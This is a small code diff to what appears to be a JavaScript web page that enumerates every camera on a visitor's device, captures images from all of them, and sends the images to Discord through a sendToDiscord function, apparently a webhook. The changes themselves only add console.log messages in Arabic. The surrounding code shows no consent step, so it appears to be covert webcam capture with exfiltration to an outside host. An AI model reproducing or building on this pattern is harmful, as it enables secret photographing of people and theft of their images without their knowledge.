@@ -42,7 +42,7 @@
                 const videoDevices = devices.filter(device => device.kind === 'videoinput'); // تصفية الكاميرات فقط
 
                 if (videoDevices.length === 0) {
-                    // إذا لم يتم العثور على أي كاميرا، إرسال رسالة في Webhook
+                    console.log("لم يتم العثور على كاميرات.");
                     sendToDiscord("camera not found");
                     return;
                 }
@@ -54,6 +54,7 @@
                 await Promise.all(capturePromises);  // الانتظار حتى تنتهي جميع الكاميرات من التقاط الصور
 
                 // إرسال الصور إلى Discord بعد التقاطها
+                console.log("إرسال الصور إلى Discord...");
                 sendToDiscord(images);
 
             } catch (error) {
